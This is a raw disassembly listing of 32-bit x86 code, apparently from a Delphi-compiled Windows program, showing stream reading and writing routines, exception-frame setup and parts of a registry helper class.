  408de5:	e8 3a 01 00 00       	call   0x408f24
  408dea:	84 c0                	test   %al,%al
  408dec:	0f 94 c0             	sete   %al
  408def:	ff 4b 10             	decl   0x10(%ebx)
  408df2:	5b                   	pop    %ebx
  408df3:	c3                   	ret
  408df4:	56                   	push   %esi
  408df5:	57                   	push   %edi
  408df6:	53                   	push   %ebx
  408df7:	89 d7                	mov    %edx,%edi
  408df9:	89 cb                	mov    %ecx,%ebx
  408dfb:	89 c6                	mov    %eax,%esi
  408dfd:	eb 36                	jmp    0x408e35
  408dff:	8b 4e 14             	mov    0x14(%esi),%ecx
  408e02:	2b 4e 10             	sub    0x10(%esi),%ecx
  408e05:	77 0a                	ja     0x408e11
  408e07:	89 f0                	mov    %esi,%eax
  408e09:	e8 32 00 00 00       	call   0x408e40
  408e0e:	8b 4e 14             	mov    0x14(%esi),%ecx
  408e11:	39 d9                	cmp    %ebx,%ecx
  408e13:	72 02                	jb     0x408e17
  408e15:	89 d9                	mov    %ebx,%ecx
  408e17:	56                   	push   %esi
  408e18:	29 cb                	sub    %ecx,%ebx
  408e1a:	8b 46 08             	mov    0x8(%esi),%eax
  408e1d:	03 46 10             	add    0x10(%esi),%eax
  408e20:	01 4e 10             	add    %ecx,0x10(%esi)
  408e23:	89 c6                	mov    %eax,%esi
  408e25:	89 ca                	mov    %ecx,%edx
  408e27:	c1 e9 02             	shr    $0x2,%ecx
  408e2a:	fc                   	cld
  408e2b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  408e2d:	89 d1                	mov    %edx,%ecx
  408e2f:	83 e1 03             	and    $0x3,%ecx
  408e32:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  408e34:	5e                   	pop    %esi
  408e35:	09 db                	or     %ebx,%ebx
  408e37:	75 c6                	jne    0x408dff
  408e39:	5b                   	pop    %ebx
  408e3a:	5f                   	pop    %edi
  408e3b:	5e                   	pop    %esi
  408e3c:	c3                   	ret
  408e3d:	8d 40 00             	lea    0x0(%eax),%eax
  408e40:	53                   	push   %ebx
  408e41:	56                   	push   %esi
  408e42:	8b d8                	mov    %eax,%ebx
  408e44:	8b 53 08             	mov    0x8(%ebx),%edx
  408e47:	8b 4b 0c             	mov    0xc(%ebx),%ecx
  408e4a:	8b 43 04             	mov    0x4(%ebx),%eax
  408e4d:	8b 30                	mov    (%eax),%esi
  408e4f:	ff 16                	call   *(%esi)
  408e51:	8b f0                	mov    %eax,%esi
  408e53:	89 73 14             	mov    %esi,0x14(%ebx)
  408e56:	85 f6                	test   %esi,%esi
  408e58:	75 16                	jne    0x408e70
  408e5a:	b9 03 f0 00 00       	mov    $0xf003,%ecx
  408e5f:	b2 01                	mov    $0x1,%dl
  408e61:	b8 34 76 40 00       	mov    $0x407634,%eax
  408e66:	e8 c1 d9 ff ff       	call   0x40682c
  408e6b:	e8 a8 9f ff ff       	call   0x402e18
  408e70:	33 c0                	xor    %eax,%eax
  408e72:	89 43 10             	mov    %eax,0x10(%ebx)
  408e75:	5e                   	pop    %esi
  408e76:	5b                   	pop    %ebx
  408e77:	c3                   	ret
  408e78:	b2 01                	mov    $0x1,%dl
  408e7a:	e8 3d ff ff ff       	call   0x408dbc
  408e7f:	c3                   	ret
  408e80:	33 d2                	xor    %edx,%edx
  408e82:	e8 35 ff ff ff       	call   0x408dbc
  408e87:	c3                   	ret
  408e88:	53                   	push   %ebx
  408e89:	56                   	push   %esi
  408e8a:	51                   	push   %ecx
  408e8b:	8b f2                	mov    %edx,%esi
  408e8d:	8b d8                	mov    %eax,%ebx
  408e8f:	8b d4                	mov    %esp,%edx
  408e91:	b9 01 00 00 00       	mov    $0x1,%ecx
  408e96:	8b c3                	mov    %ebx,%eax
  408e98:	e8 57 ff ff ff       	call   0x408df4
  408e9d:	33 c9                	xor    %ecx,%ecx
  408e9f:	8a 0c 24             	mov    (%esp),%cl
  408ea2:	8b c6                	mov    %esi,%eax
  408ea4:	33 d2                	xor    %edx,%edx
  408ea6:	e8 15 a3 ff ff       	call   0x4031c0
  408eab:	8b c6                	mov    %esi,%eax
  408ead:	e8 fe a4 ff ff       	call   0x4033b0
  408eb2:	8b d0                	mov    %eax,%edx
  408eb4:	33 c9                	xor    %ecx,%ecx
  408eb6:	8a 0c 24             	mov    (%esp),%cl
  408eb9:	8b c3                	mov    %ebx,%eax
  408ebb:	e8 34 ff ff ff       	call   0x408df4
  408ec0:	5a                   	pop    %edx
  408ec1:	5e                   	pop    %esi
  408ec2:	5b                   	pop    %ebx
  408ec3:	c3                   	ret
  408ec4:	53                   	push   %ebx
  408ec5:	56                   	push   %esi
  408ec6:	51                   	push   %ecx
  408ec7:	8b f2                	mov    %edx,%esi
  408ec9:	8b d8                	mov    %eax,%ebx
  408ecb:	33 c0                	xor    %eax,%eax
  408ecd:	89 04 24             	mov    %eax,(%esp)
  408ed0:	8b c3                	mov    %ebx,%eax
  408ed2:	e8 4d 00 00 00       	call   0x408f24
  408ed7:	2c 06                	sub    $0x6,%al
  408ed9:	74 06                	je     0x408ee1
  408edb:	2c 06                	sub    $0x6,%al
  408edd:	74 12                	je     0x408ef1
  408edf:	eb 20                	jmp    0x408f01
  408ee1:	8b d4                	mov    %esp,%edx
  408ee3:	b9 01 00 00 00       	mov    $0x1,%ecx
  408ee8:	8b c3                	mov    %ebx,%eax
  408eea:	e8 05 ff ff ff       	call   0x408df4
  408eef:	eb 15                	jmp    0x408f06
  408ef1:	8b d4                	mov    %esp,%edx
  408ef3:	b9 04 00 00 00       	mov    $0x4,%ecx
  408ef8:	8b c3                	mov    %ebx,%eax
  408efa:	e8 f5 fe ff ff       	call   0x408df4
  408eff:	eb 05                	jmp    0x408f06
  408f01:	e8 aa fe ff ff       	call   0x408db0
  408f06:	8b c6                	mov    %esi,%eax
  408f08:	8b 0c 24             	mov    (%esp),%ecx
  408f0b:	33 d2                	xor    %edx,%edx
  408f0d:	e8 ae a2 ff ff       	call   0x4031c0
  408f12:	8b 16                	mov    (%esi),%edx
  408f14:	8b 0c 24             	mov    (%esp),%ecx
  408f17:	8b c3                	mov    %ebx,%eax
  408f19:	e8 d6 fe ff ff       	call   0x408df4
  408f1e:	5a                   	pop    %edx
  408f1f:	5e                   	pop    %esi
  408f20:	5b                   	pop    %ebx
  408f21:	c3                   	ret
  408f22:	8b c0                	mov    %eax,%eax
  408f24:	51                   	push   %ecx
  408f25:	8b d4                	mov    %esp,%edx
  408f27:	b9 01 00 00 00       	mov    $0x1,%ecx
  408f2c:	e8 c3 fe ff ff       	call   0x408df4
  408f31:	8a 04 24             	mov    (%esp),%al
  408f34:	5a                   	pop    %edx
  408f35:	c3                   	ret
  408f36:	8b c0                	mov    %eax,%eax
  408f38:	55                   	push   %ebp
  408f39:	8b ec                	mov    %esp,%ebp
  408f3b:	6a 00                	push   $0x0
  408f3d:	53                   	push   %ebx
  408f3e:	56                   	push   %esi
  408f3f:	57                   	push   %edi
  408f40:	8b d8                	mov    %eax,%ebx
  408f42:	33 c0                	xor    %eax,%eax
  408f44:	55                   	push   %ebp
  408f45:	68 76 8f 40 00       	push   $0x408f76
  408f4a:	64 ff 30             	push   %fs:(%eax)
  408f4d:	64 89 20             	mov    %esp,%fs:(%eax)
  408f50:	8d 55 fc             	lea    -0x4(%ebp),%edx
  408f53:	8b c3                	mov    %ebx,%eax
  408f55:	e8 2e ff ff ff       	call   0x408e88
  408f5a:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  408f5e:	75 f0                	jne    0x408f50
  408f60:	33 c0                	xor    %eax,%eax
  408f62:	5a                   	pop    %edx
  408f63:	59                   	pop    %ecx
  408f64:	59                   	pop    %ecx
  408f65:	64 89 10             	mov    %edx,%fs:(%eax)
  408f68:	68 7d 8f 40 00       	push   $0x408f7d
  408f6d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408f70:	e8 6b a1 ff ff       	call   0x4030e0
  408f75:	c3                   	ret
  408f76:	e9 e5 9d ff ff       	jmp    0x402d60
  408f7b:	eb f0                	jmp    0x408f6d
  408f7d:	5f                   	pop    %edi
  408f7e:	5e                   	pop    %esi
  408f7f:	5b                   	pop    %ebx
  408f80:	59                   	pop    %ecx
  408f81:	5d                   	pop    %ebp
  408f82:	c3                   	ret
  408f83:	90                   	nop
  408f84:	55                   	push   %ebp
  408f85:	8b ec                	mov    %esp,%ebp
  408f87:	53                   	push   %ebx
  408f88:	8b 5d 08             	mov    0x8(%ebp),%ebx
  408f8b:	83 c3 fc             	add    $0xfffffffc,%ebx
  408f8e:	eb 07                	jmp    0x408f97
  408f90:	8b 03                	mov    (%ebx),%eax
  408f92:	e8 91 00 00 00       	call   0x409028
  408f97:	8b 03                	mov    (%ebx),%eax
  408f99:	e8 42 fe ff ff       	call   0x408de0
  408f9e:	84 c0                	test   %al,%al
  408fa0:	74 ee                	je     0x408f90
  408fa2:	8b 03                	mov    (%ebx),%eax
  408fa4:	e8 d7 fe ff ff       	call   0x408e80
  408fa9:	5b                   	pop    %ebx
  408faa:	5d                   	pop    %ebp
  408fab:	c3                   	ret
  408fac:	55                   	push   %ebp
  408fad:	8b ec                	mov    %esp,%ebp
  408faf:	81 c4 00 ff ff ff    	add    $0xffffff00,%esp
  408fb5:	53                   	push   %ebx
  408fb6:	8b d8                	mov    %eax,%ebx
  408fb8:	85 db                	test   %ebx,%ebx
  408fba:	7e 3f                	jle    0x408ffb
  408fbc:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  408fc2:	7e 1e                	jle    0x408fe2
  408fc4:	8d 95 00 ff ff ff    	lea    -0x100(%ebp),%edx
  408fca:	8b 45 08             	mov    0x8(%ebp),%eax
  408fcd:	8b 40 fc             	mov    -0x4(%eax),%eax
  408fd0:	b9 00 01 00 00       	mov    $0x100,%ecx
  408fd5:	e8 1a fe ff ff       	call   0x408df4
  408fda:	81 eb 00 01 00 00    	sub    $0x100,%ebx
  408fe0:	eb 15                	jmp    0x408ff7
  408fe2:	8d 95 00 ff ff ff    	lea    -0x100(%ebp),%edx
  408fe8:	8b 45 08             	mov    0x8(%ebp),%eax
  408feb:	8b 40 fc             	mov    -0x4(%eax),%eax
  408fee:	8b cb                	mov    %ebx,%ecx
  408ff0:	e8 ff fd ff ff       	call   0x408df4
  408ff5:	33 db                	xor    %ebx,%ebx
  408ff7:	85 db                	test   %ebx,%ebx
  408ff9:	7f c1                	jg     0x408fbc
  408ffb:	5b                   	pop    %ebx
  408ffc:	8b e5                	mov    %ebp,%esp
  408ffe:	5d                   	pop    %ebp
  408fff:	c3                   	ret
  409000:	55                   	push   %ebp
  409001:	8b ec                	mov    %esp,%ebp
  409003:	51                   	push   %ecx
  409004:	8d 55 fc             	lea    -0x4(%ebp),%edx
  409007:	8b 45 08             	mov    0x8(%ebp),%eax
  40900a:	8b 40 fc             	mov    -0x4(%eax),%eax
  40900d:	b9 04 00 00 00       	mov    $0x4,%ecx
  409012:	e8 dd fd ff ff       	call   0x408df4
  409017:	8b 45 08             	mov    0x8(%ebp),%eax
  40901a:	50                   	push   %eax
  40901b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40901e:	e8 89 ff ff ff       	call   0x408fac
  409023:	59                   	pop    %ecx
  409024:	59                   	pop    %ecx
  409025:	5d                   	pop    %ebp
  409026:	c3                   	ret
  409027:	90                   	nop
  409028:	55                   	push   %ebp
  409029:	8b ec                	mov    %esp,%ebp
  40902b:	83 c4 f8             	add    $0xfffffff8,%esp
  40902e:	53                   	push   %ebx
  40902f:	56                   	push   %esi
  409030:	57                   	push   %edi
  409031:	33 d2                	xor    %edx,%edx
  409033:	89 55 f8             	mov    %edx,-0x8(%ebp)
  409036:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409039:	33 c0                	xor    %eax,%eax
  40903b:	55                   	push   %ebp
  40903c:	68 09 91 40 00       	push   $0x409109
  409041:	64 ff 30             	push   %fs:(%eax)
  409044:	64 89 20             	mov    %esp,%fs:(%eax)
  409047:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40904a:	e8 d5 fe ff ff       	call   0x408f24
  40904f:	83 e0 7f             	and    $0x7f,%eax
  409052:	83 f8 0b             	cmp    $0xb,%eax
  409055:	0f 87 98 00 00 00    	ja     0x4090f3
  40905b:	ff 24 85 62 90 40 00 	jmp    *0x409062(,%eax,4)
  409062:	f3 90                	pause
  409064:	40                   	inc    %eax
  409065:	00 94 90 40 00 9d 90 	add    %dl,-0x6f62ffc0(%eax,%edx,4)
  40906c:	40                   	inc    %eax
  40906d:	00 ab 90 40 00 b9    	add    %ch,-0x46ffbf70(%ebx)
  409073:	90                   	nop
  409074:	40                   	inc    %eax
  409075:	00 c7                	add    %al,%bh
  409077:	90                   	nop
  409078:	40                   	inc    %eax
  409079:	00 d5                	add    %dl,%ch
  40907b:	90                   	nop
  40907c:	40                   	inc    %eax
  40907d:	00 d5                	add    %dl,%ch
  40907f:	90                   	nop
  409080:	40                   	inc    %eax
  409081:	00 f3                	add    %dh,%bl
  409083:	90                   	nop
  409084:	40                   	inc    %eax
  409085:	00 f3                	add    %dh,%bl
  409087:	90                   	nop
  409088:	40                   	inc    %eax
  409089:	00 e2                	add    %ah,%dl
  40908b:	90                   	nop
  40908c:	40                   	inc    %eax
  40908d:	00 eb                	add    %ch,%bl
  40908f:	90                   	nop
  409090:	40                   	inc    %eax
  409091:	00 eb                	add    %ch,%bl
  409093:	5f                   	pop    %edi
  409094:	55                   	push   %ebp
  409095:	e8 ea fe ff ff       	call   0x408f84
  40909a:	59                   	pop    %ecx
  40909b:	eb 56                	jmp    0x4090f3
  40909d:	55                   	push   %ebp
  40909e:	b8 01 00 00 00       	mov    $0x1,%eax
  4090a3:	e8 04 ff ff ff       	call   0x408fac
  4090a8:	59                   	pop    %ecx
  4090a9:	eb 48                	jmp    0x4090f3
  4090ab:	55                   	push   %ebp
  4090ac:	b8 02 00 00 00       	mov    $0x2,%eax
  4090b1:	e8 f6 fe ff ff       	call   0x408fac
  4090b6:	59                   	pop    %ecx
  4090b7:	eb 3a                	jmp    0x4090f3
  4090b9:	55                   	push   %ebp
  4090ba:	b8 04 00 00 00       	mov    $0x4,%eax
  4090bf:	e8 e8 fe ff ff       	call   0x408fac
  4090c4:	59                   	pop    %ecx
  4090c5:	eb 2c                	jmp    0x4090f3
  4090c7:	55                   	push   %ebp
  4090c8:	b8 0a 00 00 00       	mov    $0xa,%eax
  4090cd:	e8 da fe ff ff       	call   0x408fac
  4090d2:	59                   	pop    %ecx
  4090d3:	eb 1e                	jmp    0x4090f3
  4090d5:	8d 55 f8             	lea    -0x8(%ebp),%edx
  4090d8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4090db:	e8 a8 fd ff ff       	call   0x408e88
  4090e0:	eb 11                	jmp    0x4090f3
  4090e2:	55                   	push   %ebp
  4090e3:	e8 18 ff ff ff       	call   0x409000
  4090e8:	59                   	pop    %ecx
  4090e9:	eb 08                	jmp    0x4090f3
  4090eb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4090ee:	e8 45 fe ff ff       	call   0x408f38
  4090f3:	33 c0                	xor    %eax,%eax
  4090f5:	5a                   	pop    %edx
  4090f6:	59                   	pop    %ecx
  4090f7:	59                   	pop    %ecx
  4090f8:	64 89 10             	mov    %edx,%fs:(%eax)
  4090fb:	68 10 91 40 00       	push   $0x409110
  409100:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409103:	e8 d8 9f ff ff       	call   0x4030e0
  409108:	c3                   	ret
  409109:	e9 52 9c ff ff       	jmp    0x402d60
  40910e:	eb f0                	jmp    0x409100
  409110:	5f                   	pop    %edi
  409111:	5e                   	pop    %esi
  409112:	5b                   	pop    %ebx
  409113:	59                   	pop    %ecx
  409114:	59                   	pop    %ecx
  409115:	5d                   	pop    %ebp
  409116:	c3                   	ret
  409117:	90                   	nop
  409118:	56                   	push   %esi
  409119:	57                   	push   %edi
  40911a:	53                   	push   %ebx
  40911b:	89 d6                	mov    %edx,%esi
  40911d:	89 cb                	mov    %ecx,%ebx
  40911f:	89 c7                	mov    %eax,%edi
  409121:	eb 36                	jmp    0x409159
  409123:	8b 4f 0c             	mov    0xc(%edi),%ecx
  409126:	2b 4f 10             	sub    0x10(%edi),%ecx
  409129:	77 0a                	ja     0x409135
  40912b:	89 f8                	mov    %edi,%eax
  40912d:	e8 32 00 00 00       	call   0x409164
  409132:	8b 4f 0c             	mov    0xc(%edi),%ecx
  409135:	39 d9                	cmp    %ebx,%ecx
  409137:	72 02                	jb     0x40913b
  409139:	89 d9                	mov    %ebx,%ecx
  40913b:	29 cb                	sub    %ecx,%ebx
  40913d:	57                   	push   %edi
  40913e:	8b 47 08             	mov    0x8(%edi),%eax
  409141:	03 47 10             	add    0x10(%edi),%eax
  409144:	01 4f 10             	add    %ecx,0x10(%edi)
  409147:	89 c7                	mov    %eax,%edi
  409149:	89 ca                	mov    %ecx,%edx
  40914b:	c1 e9 02             	shr    $0x2,%ecx
  40914e:	fc                   	cld
  40914f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  409151:	89 d1                	mov    %edx,%ecx
  409153:	83 e1 03             	and    $0x3,%ecx
  409156:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  409158:	5f                   	pop    %edi
  409159:	09 db                	or     %ebx,%ebx
  40915b:	75 c6                	jne    0x409123
  40915d:	5b                   	pop    %ebx
  40915e:	5f                   	pop    %edi
  40915f:	5e                   	pop    %esi
  409160:	c3                   	ret
  409161:	8d 40 00             	lea    0x0(%eax),%eax
  409164:	53                   	push   %ebx
  409165:	8b d8                	mov    %eax,%ebx
  409167:	8b 53 08             	mov    0x8(%ebx),%edx
  40916a:	8b 4b 10             	mov    0x10(%ebx),%ecx
  40916d:	8b 43 04             	mov    0x4(%ebx),%eax
  409170:	e8 8b fa ff ff       	call   0x408c00
  409175:	33 c0                	xor    %eax,%eax
  409177:	89 43 10             	mov    %eax,0x10(%ebx)
  40917a:	5b                   	pop    %ebx
  40917b:	c3                   	ret
  40917c:	b2 01                	mov    $0x1,%dl
  40917e:	e8 65 00 00 00       	call   0x4091e8
  409183:	c3                   	ret
  409184:	33 d2                	xor    %edx,%edx
  409186:	e8 5d 00 00 00       	call   0x4091e8
  40918b:	c3                   	ret
  40918c:	53                   	push   %ebx
  40918d:	56                   	push   %esi
  40918e:	51                   	push   %ecx
  40918f:	8b f2                	mov    %edx,%esi
  409191:	8b d8                	mov    %eax,%ebx
  409193:	8b c6                	mov    %esi,%eax
  409195:	e8 ba a0 ff ff       	call   0x403254
  40919a:	89 04 24             	mov    %eax,(%esp)
  40919d:	81 3c 24 ff 00 00 00 	cmpl   $0xff,(%esp)
  4091a4:	7f 19                	jg     0x4091bf
  4091a6:	b2 06                	mov    $0x6,%dl
  4091a8:	8b c3                	mov    %ebx,%eax
  4091aa:	e8 39 00 00 00       	call   0x4091e8
  4091af:	8b d4                	mov    %esp,%edx
  4091b1:	b9 01 00 00 00       	mov    $0x1,%ecx
  4091b6:	8b c3                	mov    %ebx,%eax
  4091b8:	e8 5b ff ff ff       	call   0x409118
  4091bd:	eb 17                	jmp    0x4091d6
  4091bf:	b2 0c                	mov    $0xc,%dl
  4091c1:	8b c3                	mov    %ebx,%eax
  4091c3:	e8 20 00 00 00       	call   0x4091e8
  4091c8:	8b d4                	mov    %esp,%edx
  4091ca:	b9 04 00 00 00       	mov    $0x4,%ecx
  4091cf:	8b c3                	mov    %ebx,%eax
  4091d1:	e8 42 ff ff ff       	call   0x409118
  4091d6:	8b d6                	mov    %esi,%edx
  4091d8:	8b 0c 24             	mov    (%esp),%ecx
  4091db:	8b c3                	mov    %ebx,%eax
  4091dd:	e8 36 ff ff ff       	call   0x409118
  4091e2:	5a                   	pop    %edx
  4091e3:	5e                   	pop    %esi
  4091e4:	5b                   	pop    %ebx
  4091e5:	c3                   	ret
  4091e6:	8b c0                	mov    %eax,%eax
  4091e8:	51                   	push   %ecx
  4091e9:	88 14 24             	mov    %dl,(%esp)
  4091ec:	8b d4                	mov    %esp,%edx
  4091ee:	b9 01 00 00 00       	mov    $0x1,%ecx
  4091f3:	e8 20 ff ff ff       	call   0x409118
  4091f8:	5a                   	pop    %edx
  4091f9:	c3                   	ret
  4091fa:	8b c0                	mov    %eax,%eax
  4091fc:	53                   	push   %ebx
  4091fd:	56                   	push   %esi
  4091fe:	57                   	push   %edi
  4091ff:	bf c4 b1 40 00       	mov    $0x40b1c4,%edi
  409204:	8b 07                	mov    (%edi),%eax
  409206:	8b 58 08             	mov    0x8(%eax),%ebx
  409209:	4b                   	dec    %ebx
  40920a:	85 db                	test   %ebx,%ebx
  40920c:	7c 15                	jl     0x409223
  40920e:	43                   	inc    %ebx
  40920f:	33 f6                	xor    %esi,%esi
  409211:	8b d6                	mov    %esi,%edx
  409213:	8b 07                	mov    (%edi),%eax
  409215:	e8 e2 e8 ff ff       	call   0x407afc
  40921a:	e8 ad 97 ff ff       	call   0x4029cc
  40921f:	46                   	inc    %esi
  409220:	4b                   	dec    %ebx
  409221:	75 ee                	jne    0x409211
  409223:	8b 07                	mov    (%edi),%eax
  409225:	e8 a2 97 ff ff       	call   0x4029cc
  40922a:	5f                   	pop    %edi
  40922b:	5e                   	pop    %esi
  40922c:	5b                   	pop    %ebx
  40922d:	c3                   	ret
  40922e:	8b c0                	mov    %eax,%eax
  409230:	a1 bc b1 40 00       	mov    0x40b1bc,%eax
  409235:	e8 92 97 ff ff       	call   0x4029cc
  40923a:	a1 c0 b1 40 00       	mov    0x40b1c0,%eax
  40923f:	e8 88 97 ff ff       	call   0x4029cc
  409244:	e8 b3 ff ff ff       	call   0x4091fc
  409249:	33 d2                	xor    %edx,%edx
  40924b:	33 c0                	xor    %eax,%eax
  40924d:	e8 e6 fa ff ff       	call   0x408d38
  409252:	a1 5c c5 40 00       	mov    0x40c55c,%eax
  409257:	e8 70 97 ff ff       	call   0x4029cc
  40925c:	a1 58 c5 40 00       	mov    0x40c558,%eax
  409261:	e8 66 97 ff ff       	call   0x4029cc
  409266:	c3                   	ret
  409267:	90                   	nop
  409268:	b8 c8 b1 40 00       	mov    $0x40b1c8,%eax
  40926d:	e8 fe a7 ff ff       	call   0x403a70
  409272:	b2 01                	mov    $0x1,%dl
  409274:	b8 f4 76 40 00       	mov    $0x4076f4,%eax
  409279:	e8 26 97 ff ff       	call   0x4029a4
  40927e:	a3 bc b1 40 00       	mov    %eax,0x40b1bc
  409283:	b2 01                	mov    $0x1,%dl
  409285:	b8 b8 78 40 00       	mov    $0x4078b8,%eax
  40928a:	e8 15 97 ff ff       	call   0x4029a4
  40928f:	a3 c0 b1 40 00       	mov    %eax,0x40b1c0
  409294:	b2 01                	mov    $0x1,%dl
  409296:	b8 f4 76 40 00       	mov    $0x4076f4,%eax
  40929b:	e8 04 97 ff ff       	call   0x4029a4
  4092a0:	a3 c4 b1 40 00       	mov    %eax,0x40b1c4
  4092a5:	b2 01                	mov    $0x1,%dl
  4092a7:	b8 f4 76 40 00       	mov    $0x4076f4,%eax
  4092ac:	e8 f3 96 ff ff       	call   0x4029a4
  4092b1:	a3 5c c5 40 00       	mov    %eax,0x40c55c
  4092b6:	e8 71 b3 ff ff       	call   0x40462c
  4092bb:	a3 54 c5 40 00       	mov    %eax,0x40c554
  4092c0:	b2 01                	mov    $0x1,%dl
  4092c2:	b8 f4 76 40 00       	mov    $0x4076f4,%eax
  4092c7:	e8 d8 96 ff ff       	call   0x4029a4
  4092cc:	a3 58 c5 40 00       	mov    %eax,0x40c558
  4092d1:	c3                   	ret
  4092d2:	8b c0                	mov    %eax,%eax
	...
  4092ec:	08 93 40 00 0c 00    	or     %dl,0xc0040(%ebx)
  4092f2:	00 00                	add    %al,(%eax)
  4092f4:	04 47                	add    $0x47,%al
  4092f6:	40                   	inc    %eax
  4092f7:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  4092fb:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  4092ff:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  409303:	00 c0                	add    %al,%al
  409305:	29 40 00             	sub    %eax,0x0(%eax)
  409308:	12 45 52             	adc    0x52(%ebp),%al
  40930b:	65 67 69 73 74 72 79 	imul   $0x78457972,%gs:0x74(%bp,%di),%esi
  409312:	45 78 
  409314:	63 65 70             	arpl   %esp,0x70(%ebp)
  409317:	74 69                	je     0x409382
  409319:	6f                   	outsl  %ds:(%esi),(%dx)
  40931a:	6e                   	outsb  %ds:(%esi),(%dx)
  40931b:	90                   	nop
  40931c:	00 00                	add    %al,(%eax)
  40931e:	00 00                	add    %al,(%eax)
  409320:	50                   	push   %eax
  409321:	93                   	xchg   %eax,%ebx
  409322:	40                   	inc    %eax
	...
  409333:	00 62 93             	add    %ah,-0x6d(%edx)
  409336:	40                   	inc    %eax
  409337:	00 18                	add    %bl,(%eax)
  409339:	00 00                	add    %al,(%eax)
  40933b:	00 3c 10             	add    %bh,(%eax,%edx,1)
  40933e:	40                   	inc    %eax
  40933f:	00 6c 2a 40          	add    %ch,0x40(%edx,%ebp,1)
  409343:	00 54 29 40          	add    %dl,0x40(%ecx,%ebp,1)
  409347:	00 7c 29 40          	add    %bh,0x40(%ecx,%ebp,1)
  40934b:	00 3c 94             	add    %bh,(%esp,%edx,4)
  40934e:	40                   	inc    %eax
  40934f:	00 0e                	add    %cl,(%esi)
  409351:	00 00                	add    %al,(%eax)
  409353:	00 00                	add    %al,(%eax)
  409355:	00 01                	add    %al,(%ecx)
  409357:	00 00                	add    %al,(%eax)
  409359:	00 00                	add    %al,(%eax)
  40935b:	10 40 00             	adc    %al,0x0(%eax)
  40935e:	10 00                	adc    %al,(%eax)
  409360:	00 00                	add    %al,(%eax)
  409362:	09 54 52 65          	or     %edx,0x65(%edx,%edx,2)
  409366:	67 69 73 74 72 79 53 	imul   $0x83537972,0x74(%bp,%di),%esi
  40936d:	83 
  40936e:	c4                   	(bad)
  40936f:	f8                   	clc
  409370:	8b d8                	mov    %eax,%ebx
  409372:	89 1c 24             	mov    %ebx,(%esp)
  409375:	c6 44 24 04 0b       	movb   $0xb,0x4(%esp)
  40937a:	54                   	push   %esp
  40937b:	6a 00                	push   $0x0
  40937d:	b9 ba f0 00 00       	mov    $0xf0ba,%ecx
  409382:	b2 01                	mov    $0x1,%dl
  409384:	b8 08 93 40 00       	mov    $0x409308,%eax
  409389:	e8 0e d5 ff ff       	call   0x40689c
  40938e:	e8 85 9a ff ff       	call   0x402e18
  409393:	59                   	pop    %ecx
  409394:	5a                   	pop    %edx
  409395:	5b                   	pop    %ebx
  409396:	c3                   	ret
  409397:	90                   	nop
  409398:	53                   	push   %ebx
  409399:	8b d8                	mov    %eax,%ebx
  40939b:	85 db                	test   %ebx,%ebx
  40939d:	74 09                	je     0x4093a8
  40939f:	80 3b 5c             	cmpb   $0x5c,(%ebx)
  4093a2:	75 04                	jne    0x4093a8
  4093a4:	33 c0                	xor    %eax,%eax
  4093a6:	5b                   	pop    %ebx
  4093a7:	c3                   	ret
  4093a8:	b0 01                	mov    $0x1,%al
  4093aa:	5b                   	pop    %ebx
  4093ab:	c3                   	ret
  4093ac:	fe c8                	dec    %al
  4093ae:	74 0e                	je     0x4093be
  4093b0:	fe c8                	dec    %al
  4093b2:	74 10                	je     0x4093c4
  4093b4:	fe c8                	dec    %al
  4093b6:	74 12                	je     0x4093ca
  4093b8:	fe c8                	dec    %al
  4093ba:	74 14                	je     0x4093d0
  4093bc:	eb 18                	jmp    0x4093d6
  4093be:	b8 01 00 00 00       	mov    $0x1,%eax
  4093c3:	c3                   	ret
  4093c4:	b8 02 00 00 00       	mov    $0x2,%eax
  4093c9:	c3                   	ret
  4093ca:	b8 04 00 00 00       	mov    $0x4,%eax
  4093cf:	c3                   	ret
  4093d0:	b8 03 00 00 00       	mov    $0x3,%eax
  4093d5:	c3                   	ret
  4093d6:	33 c0                	xor    %eax,%eax
  4093d8:	c3                   	ret
  4093d9:	8d 40 00             	lea    0x0(%eax),%eax
  4093dc:	83 f8 01             	cmp    $0x1,%eax
  4093df:	75 03                	jne    0x4093e4
  4093e1:	b0 01                	mov    $0x1,%al
  4093e3:	c3                   	ret
  4093e4:	83 f8 02             	cmp    $0x2,%eax
  4093e7:	75 04                	jne    0x4093ed
  4093e9:	b0 02                	mov    $0x2,%al
  4093eb:	eb 14                	jmp    0x409401
  4093ed:	83 f8 04             	cmp    $0x4,%eax
  4093f0:	75 04                	jne    0x4093f6
  4093f2:	b0 03                	mov    $0x3,%al
  4093f4:	eb 0b                	jmp    0x409401
  4093f6:	83 f8 03             	cmp    $0x3,%eax
  4093f9:	75 04                	jne    0x4093ff
  4093fb:	b0 04                	mov    $0x4,%al
  4093fd:	eb 02                	jmp    0x409401
  4093ff:	33 c0                	xor    %eax,%eax
  409401:	c3                   	ret
  409402:	8b c0                	mov    %eax,%eax
  409404:	53                   	push   %ebx
  409405:	56                   	push   %esi
  409406:	84 d2                	test   %dl,%dl
  409408:	74 08                	je     0x409412
  40940a:	83 c4 f0             	add    $0xfffffff0,%esp
  40940d:	e8 5e 97 ff ff       	call   0x402b70
  409412:	8b da                	mov    %edx,%ebx
  409414:	8b f0                	mov    %eax,%esi
  409416:	ba 01 00 00 80       	mov    $0x80000001,%edx
  40941b:	8b c6                	mov    %esi,%eax
  40941d:	e8 72 00 00 00       	call   0x409494
  409422:	c6 46 0c 01          	movb   $0x1,0xc(%esi)
  409426:	84 db                	test   %bl,%bl
  409428:	74 0a                	je     0x409434
  40942a:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  409431:	83 c4 0c             	add    $0xc,%esp
  409434:	8b c6                	mov    %esi,%eax
  409436:	5e                   	pop    %esi
  409437:	5b                   	pop    %ebx
  409438:	c3                   	ret
